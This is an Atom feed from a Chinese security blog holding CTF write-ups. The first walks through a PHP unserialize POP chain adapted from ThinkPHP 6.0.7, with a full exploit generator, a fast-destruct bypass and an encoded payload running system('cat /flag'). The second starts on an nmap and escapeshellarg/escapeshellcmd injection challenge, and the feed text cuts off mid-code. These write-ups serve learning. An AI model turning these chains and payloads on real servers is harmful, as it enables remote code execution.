<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>cr0fyの博客</title>
  
  <subtitle>生如夏花之灿烂，死如秋叶之静美</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-03-14T14:56:14.424Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>cr0fy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>改编ThinkPHP v6.0.7 eval反序列化题目</title>
    <link href="http://example.com/2022/03/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/"/>
    <id>http://example.com/2022/03/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-14T12:09:05.000Z</published>
    <updated>2022-03-14T14:56:14.424Z</updated>
    
    <content type="html"><![CDATA[<p>在一次内部赛中,偶遇一个反序列化题目,它是改编ThinkPHP v6.0.7 eval反序列化的一个题目,涉及的知识也比较经典.</p><span id="more"></span><h1 id="源码附上"><a href="#源码附上" class="headerlink" title="源码附上"></a>源码附上</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="variable">$args</span>, lcfirst(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;ohhh&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ohhh</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">string</span> <span class="variable">$rule</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>])) &#123;</span><br><span class="line">            <span class="comment">// 注册的验证规则</span></span><br><span class="line">            <span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gogogo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$brother</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;just go little&quot;</span> . <span class="keyword">$this</span>-&gt;brother;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stop</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$warn</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$real_talk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn-&gt;whoareyou(<span class="keyword">$this</span>-&gt;real_talk); <span class="comment">//别管这玩意哪里来的了，我也不知道</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;快点学会反序列化好么&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="逐步分析"><a href="#逐步分析" class="headerlink" title="逐步分析"></a>逐步分析</h1><p>源码中有 <strong><code>destruct()</code> <code> toString()</code> <code> call()</code></strong>  这几个魔术方法</p><p>我们需要构造链子到达<code>Evil</code>类执行<code>cmd</code>方法达到命令执行的效果</p><h2 id="魔术跳板"><a href="#魔术跳板" class="headerlink" title="魔术跳板"></a>魔术跳板</h2><h3 id="从destruct到toString"><a href="#从destruct到toString" class="headerlink" title="从destruct到toString"></a>从destruct到toString</h3><p>首先肯定要是从<code>destruct()</code>方法入口,其中有字符串拼接    <strong>return “just go little” . $this-&gt;brother;</strong></p><p>而<code>$brother</code>是可控的,直接让其指向存在<code>toString</code>方法的类就可以触发该魔术方法</p><p>这步需要的的操作就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;brother = <span class="keyword">new</span> Stop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="提一下触发toString的条件"><a href="#提一下触发toString的条件" class="headerlink" title="提一下触发toString的条件"></a>提一下触发toString的条件</h4><p>(1) echo($obj) / print($obj) 打印时会触发</p><p>(2) 反序列化对象与字符串连接时</p><p>(3) 反序列化对象参与格式化字符串时</p><p>(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p><p>(5) 反序列化对象参与格式化SQL语句，绑定参数时</p><p>(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p><p>(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</p><p>(8) 反序列化的对象作为 class_exists() 的参数的时候</p><h3 id="从toString到call"><a href="#从toString到call" class="headerlink" title="从toString到call"></a>从toString到call</h3><p><code>__call()</code>方法的触发是需要调用不存在的方法</p><p>而在<code>toString</code>方法中就存在whoareyou方法没有被定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;warn-&gt;whoareyou(<span class="variable">$real_talk</span>);</span><br></pre></td></tr></table></figure><p>而且<code>warn</code>和<code>real_talk</code>都是可控的,这个时候只需要让<code>warn</code>指向存在<code>call</code>方法的类就可以跳转,并且参数也传给 __call方法</p><p>这步所需要的操作为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;real_talk = <span class="string">&quot;*******************&quot;</span>; <span class="comment">//命令执行的参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn = <span class="keyword">new</span> Soeasy();  <span class="comment">//换成Soeasy去触发__call</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="分析Soeasy类"><a href="#分析Soeasy类" class="headerlink" title="分析Soeasy类"></a>分析Soeasy类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="variable">$args</span>, lcfirst(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;ohhh&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ohhh</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">string</span> <span class="variable">$rule</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>])) &#123;</span><br><span class="line">            <span class="comment">// 注册的验证规则</span></span><br><span class="line">            <span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数传给<code>__call</code>时</p><p><code>$method</code>为 ‘whoareyou’          <code>$args</code>为数组 [‘$real_talk’]</p><p>通过<code>array_push</code>函数(<em>用法:向数组尾部插入一个或多个元素</em>)</p><p>使<code>$args</code>变成 [‘$real_talk’,’whoareyou’]</p><p>然后通过<code>call_user_func_array</code>函数将数据$args传入ohhh方法中</p><p>此时          </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span>=<span class="variable">$real_talk</span>         <span class="variable">$rule</span>=whoareyou</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">等价于</span><br><span class="line"><span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="string">&#x27;whoareyou&#x27;</span>], [<span class="variable">$real_talk</span>]);</span><br></pre></td></tr></table></figure><p>此刻在Soeasy类下面定义一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;type[<span class="string">&#x27;whoareyou&#x27;</span>] = [<span class="keyword">new</span> Evil(), <span class="string">&#x27;cmd&#x27;</span>]; <span class="comment">//调用任意方法任意类</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>就会将<code>$real_talk</code>参数传入Evil类的cmd方法中,进行命令执行</p><p>分析完毕</p><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function cmd($code) &#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;code = $code;</span></span><br><span class="line"><span class="comment">        eval(&#x27;?&gt;&#x27; . $this-&gt;code);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = [</span><br><span class="line">            <span class="string">&quot;whoareyou&quot;</span> =&gt; [<span class="keyword">new</span> Evil,<span class="string">&#x27;cmd&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __call($method, $args) &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;call方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        array_push($args, lcfirst($method));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        return call_user_func_array([$this, &#x27;ohhh&#x27;], $args);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public function ohhh($value, string $rule) &#123;          //$value相当于$real_talk   $rule就是whoareyou</span></span><br><span class="line"><span class="comment">        echo(4);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        if (isset($this-&gt;type[$rule])) &#123;</span></span><br><span class="line"><span class="comment">            // 注册的验证规则</span></span><br><span class="line"><span class="comment">            $result = call_user_func_array($this-&gt;type[$rule], [$value]);   //call_user_func_array($this-&gt;type[&#x27;whoareyou&#x27;], [$real_talk])</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gogogo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$brother</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;brother = <span class="keyword">new</span> Stop();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __destruct() &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;destruct方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        return  &quot;just go little&quot; . $this-&gt;brother;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stop</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$real_talk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$warn</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;real_talk=<span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn = <span class="keyword">new</span> Soeasy();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __toString() &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;toString方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        $blind=$this-&gt;warn-&gt;whoareyou($this-&gt;real_talk); //别管这玩意哪里来的了，我也不知道</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Gogogo();</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是输入payload后仍然会报错</p><p>问题就出现在这行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;快点学会反序列化好么&quot;</span>);</span><br></pre></td></tr></table></figure><p>它会在反序列化之前开始报错,我们必须绕过它</p><h1 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h1><p>提前反序列化就要运用到<strong>fast destruct</strong></p><p>在著名的php反序列工具phpggc中提及了这一概念。具体来说，在PHP中有：</p><p>&gt;1. 如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p><p>&gt; 2. 如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p><p>&gt;</p><p>但是通过 <code>fast destruct</code> 我们可以跳出这种固定的生命周期</p><p>方法是修改序列化字符串的结构，利用错误的结构导致只完成了部分反序列化的 unserialize 强制退出，提前触发 <code>__destruct()</code></p><p>可以去掉末尾的<code>&#125;</code> 删的一个不剩都可以</p><p>或者更改生成序列化的数字元素个数</p><p>或者在末尾最后一个<code>&#125;</code>前插入一些奇奇怪怪的字符<code>;</code>、<code>.</code> 等等等等</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>Gogogo%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>brother%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>Stop%<span class="number">22</span>%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">12</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>real_talk%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">28</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Fflag%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>warn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>Soeasy%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>type%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>whoareyou%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>Evil%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Di%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220314222932459.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在一次内部赛中,偶遇一个反序列化题目,它是改编ThinkPHP v6.0.7 eval反序列化的一个题目,涉及的知识也比较经典.&lt;/p&gt;</summary>
    
    
    
    <category term="反序列化" scheme="http://example.com/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF 2018_Online Tool</title>
    <link href="http://example.com/2021/11/22/[BUUCTF%202018]%20Online%20Tool/"/>
    <id>http://example.com/2021/11/22/[BUUCTF%202018]%20Online%20Tool/</id>
    <published>2021-11-22T12:07:37.000Z</published>
    <updated>2021-11-23T12:43:57.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="该题的知识点"><a href="#该题的知识点" class="headerlink" title="该题的知识点"></a>该题的知识点</h1><p>1.nmap的将命令和结果写到文件(也许能构造木马)</p><p>2.escapeshellarg()和escapeshellcmd() 的绕过</p><span id="more"></span><h1 id="先附上题目代码"><a href="#先附上题目代码" class="headerlink" title="先附上题目代码"></a>先附上题目代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>先是获取服务器IP地址，没啥用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有设立文件夹，由此得知文件名不是固定的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">   @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">   chdir(<span class="variable">$sandbox</span>);</span><br></pre></td></tr></table></figure><p>传入参数$host，并经过两个函数处理，最后是和nmap命令拼接并执行</p><figure class="highlight php"><table><tr><td 